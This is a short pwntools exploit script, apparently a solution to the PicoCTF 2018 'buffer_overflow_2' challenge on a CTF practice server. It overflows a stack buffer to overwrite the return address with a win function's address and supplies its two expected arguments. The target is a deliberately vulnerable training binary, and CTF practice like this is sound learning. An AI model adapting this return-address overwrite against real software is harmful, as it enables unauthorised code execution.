from pwn import *

context.log_level = 'debug'
context.arch = 'i386'
# io = process('./PicoCTF_2018_buffer_overflow_2')
io = remote('node4.buuoj.cn',28982)
elf = ELF('./PicoCTF_2018_buffer_overflow_2')

win_p1 = 0xDEADBEEF
win_p2 = 0xDEADC0DE
win_fun = 0x080485CB
main_fun = elf.sym['main']
payload = b'a'*(0x6c+4) + p32(win_fun) + p32(main_fun) + p32(win_p1) + p32(win_p2)

io.sendafter(b'Please enter your string: \n',payload)
io.interactive()